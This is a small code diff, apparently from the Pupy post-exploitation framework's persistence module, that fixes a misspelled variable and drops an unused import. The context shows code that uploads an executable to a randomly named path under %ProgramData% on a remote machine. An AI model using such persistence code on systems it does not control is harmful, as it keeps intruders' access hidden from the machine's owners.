@@ -19,7 +19,6 @@ from rpyc.utils.classic import upload
 import random
 import pupygen
 import os.path
-import stat
 import string
 
 __class_name__="PersistenceModule"
@@ -162,7 +161,7 @@ class PersistenceModule(PupyModule):
                 self.error('Executable file not found: %s' % args.exe)
                 return
 
-            exandvars = self.client.remote('os.path', 'expandvars', False)
+            expandvars = self.client.remote('os.path', 'expandvars', False)
 
             remotefile = expandvars(
                 "%ProgramData%\\{}.exe".format(''.join([
